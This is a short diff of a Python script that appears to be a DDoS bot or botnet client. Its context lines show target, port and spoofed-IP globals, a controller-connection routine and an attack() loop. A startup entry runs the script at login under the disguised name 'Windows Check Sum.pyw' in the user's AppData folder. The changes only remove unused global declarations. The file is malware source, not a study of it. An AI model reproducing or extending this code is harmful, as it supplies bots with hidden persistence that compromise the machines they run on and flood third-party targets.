@@ -20,9 +20,7 @@ def main():
 
     global target
     global port_
-    global fakeIP
     global threads
-    global master
     global Continue
     global connected
 
@@ -50,7 +48,6 @@ def main():
             f.write('start '+ "C:\\Users\\" + Lll + "\\AppData\\Local\\Microsoft\\WindowsApps\\Windows Check Sum.pyw")
 
     def con():
-        global master
         global connected
         global Continue
 
@@ -77,9 +74,7 @@ def main():
     def attack():
         global target
         global port_
-        global fakeIP
         global threads
-        global master
         global Continue
         global connected
         while Continue == True:
